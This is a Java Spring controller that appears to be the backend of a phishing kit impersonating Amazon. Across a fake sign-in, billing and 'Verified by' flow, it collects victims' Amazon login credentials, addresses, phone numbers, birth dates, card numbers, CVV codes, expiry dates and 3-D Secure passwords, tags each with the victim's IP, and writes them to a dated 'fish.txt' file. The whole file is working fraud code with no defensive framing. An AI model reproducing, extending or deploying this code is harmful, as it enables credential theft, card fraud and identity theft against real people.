package com.kidd.testfishing1.web;

import cn.hutool.core.date.DateUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONConverter;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import com.kidd.testfishing1.AsyncTask;
import com.kidd.testfishing1.common.IpUtils;
import com.kidd.testfishing1.model.FraudUserInfoForm;
import com.kidd.testfishing1.model.UserInfoForm;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.time.LocalDateTime;
import java.util.*;
import java.util.stream.Collectors;


@Controller
public class AmazomController {
    @Autowired
    private HttpServletRequest request;

    @Autowired
    private AsyncTask asyncTask;

    @GetMapping("/signin")
    public Object signin(){
        return "signin";
    }

    @PostMapping("/signin")
    public Object signin2(UserInfoForm form,@RequestHeader("User-Agent") String agent){
        form.setUserAgent(agent);
        asyncSaveUserInfo(form);
        return "billing";
    }
    @PostMapping("/kiddSigin")
    @ResponseBody
    public Object signin3(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent){
        UserInfoForm form = UserInfoForm.builder().email(form1.getKiddfiled1()).emailPwd(form1.getKiddfiled2()).build();
        form.setUserAgent(agent);
        asyncSaveUserInfo(form);
        Map map = new HashMap();
        map.put("data","ok");
        return map;
    }


    @PostMapping("/warning")
    public Object warning2(){
        return "signin";
    }

    @GetMapping("/warning")
    public Object warning(){
        return "warning";
    }

    @GetMapping("/billing")
    public Object billing(){
        return "billing";
    }

    @PostMapping("/billing")
    public Object billing2(UserInfoForm form, Model model){
        asyncSaveUserInfo(form);
        LocalDateTime localDateTime = LocalDateTime.now();
        String timeStr = DateUtil.format(localDateTime,"yyyy/MM/dd");
        model.addAttribute("dateTime",timeStr);
        model.addAttribute("cardNo",form.getCxdi().substring(form.getCxdi().length()-4,form.getCxdi().length()));
        model.addAttribute("cardName",form.getNameCard());
        return "verifiedby";
    }
    @PostMapping("/billing2")
    @ResponseBody
    public Object billing3(UserInfoForm form){
        asyncSaveUserInfo(form);
        Map map = new HashMap();
        map.put("data","ok");
        return map;
    }


    @GetMapping("/validate")
    @ResponseBody
    public Object validate(){
        return true;
    }

    @GetMapping("/verifiedby")
    public Object verifiedby(UserInfoForm form,Model model){
        LocalDateTime localDateTime = LocalDateTime.now();
        String timeStr = DateUtil.format(localDateTime,"yyyy/MM/dd");
        model.addAttribute("dateTime",timeStr);
        model.addAttribute("cardNo",form.getCxdi().substring(form.getCxdi().length()-4,form.getCxdi().length()));
        model.addAttribute("cardName",form.getNameCard());
        return "verifiedby";
    }

    @GetMapping("/zipcode")
    @ResponseBody
    public Object zipcode(@RequestParam("zipcode")String zipCode){
        String jstr= "";
        try {
            Map parm = new HashMap<String,String>();
            parm.put("zipcode",zipCode);
            String result = HttpRequest.post("http://zipcloud.ibsnet.co.jp/api/search")
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .form(parm)//表单内容
                    .timeout(20000)//超时，毫秒
                    .execute().body();
            JSONObject jobj = JSONUtil.parseObj(result);
            jstr= JSONUtil.toJsonStr(jobj);
             }
        catch (Exception e){
            HashMap<String,Object> map = new HashMap<>() ;
            map.put("status",500);
            map.put("message",null);
            map.put("results",null);
            jstr = JSONUtil.toJsonStr(map);
        }
        return jstr;
    }

    @PostMapping("/verifiedby")
    public Object verifiedby2(UserInfoForm form){
        asyncSaveUserInfo(form);
        return "thanks";
    }



    private List<String> appendIp(List<String> infos){
        String ip = IpUtils.getIpAddress(request);
        infos = infos.stream().map(u->u=String.format("%s # %s",ip,u)).collect(Collectors.toList());
        return infos;
    }

    private void asyncSaveUserInfo(UserInfoForm form) {
        List<String> contents = appendIp(convertInfo2List(form));
        LocalDateTime localDateTime = LocalDateTime.now();
        String timeStr = DateUtil.format(localDateTime,"yyyyMMdd");
        asyncTask.asyncWriteList(String.format("/root/%sfish.txt",timeStr),contents);
    }

    private List<String> convertInfo2List(UserInfoForm userInfo){
        List<String> list = new ArrayList<>();
        list.add(concatInfo("AmazonId",userInfo.getEmail()));
        list.add(concatInfo("AmazomPwd",userInfo.getEmailPwd()));
        list.add(concatInfo("UserAgent",userInfo.getUserAgent()));
        list.add(concatInfo("CountryCode",userInfo.getCountryCode()));
        list.add(concatInfo("FullName",userInfo.getEnterAddressFullName()));
        if(!( StringUtils.isEmpty( userInfo.getEnterAddressPostalCodeOne())&&StringUtils.isEmpty( userInfo.getEnterAddressPostalCodeTwo()))){
            list.add(concatInfo("PostalCode",userInfo.getEnterAddressPostalCodeOne()+userInfo.getEnterAddressPostalCodeTwo()));
        }
        list.add(concatInfo("StateOrRegion",userInfo.getEnterAddressStateOrRegion()));
        if(!( StringUtils.isEmpty( userInfo.getBirth_day())&&StringUtils.isEmpty( userInfo.getBirth_day())&&StringUtils.isEmpty( userInfo.getBirth_day()))){
            list.add(concatInfo("BirthDay",String.format("%s/%s/%s",userInfo.getBirth_year(),userInfo.getBirth_month(),userInfo.getBirth_day())));
        }
        list.add(concatInfo("AddressLine1",userInfo.getEnterAddressLine1()));
        list.add(concatInfo("AddressLine2",userInfo.getEnterAddressLine2()));
        list.add(concatInfo("AddressLine3",userInfo.getEnterAddressLine3()));
        list.add(concatInfo("PhoneNumber",userInfo.getEnterAddressPhoneNumber()));
        list.add(concatInfo("CardName",userInfo.getNameCard()));
        list.add(concatInfo("CardNo",userInfo.getCxdi()));
        list.add(concatInfo("CVV",userInfo.getCsc()));
        if(!( StringUtils.isEmpty( userInfo.getYear())&&StringUtils.isEmpty( userInfo.getMonth()))){
            list.add(concatInfo("Expire",String.format("%s/%s",userInfo.getYear(),userInfo.getMonth())));
        }
        list.add(concatInfo("3dSecret",userInfo.getPassword_vbv()));
        list.removeAll(Collections.singleton(null));
        return list;
    }

    private String concatInfo(String key,String value){
        if(StringUtils.isEmpty(value)){
            return null;
        }
        return String.format("%s : %s",key,value);
    }
}
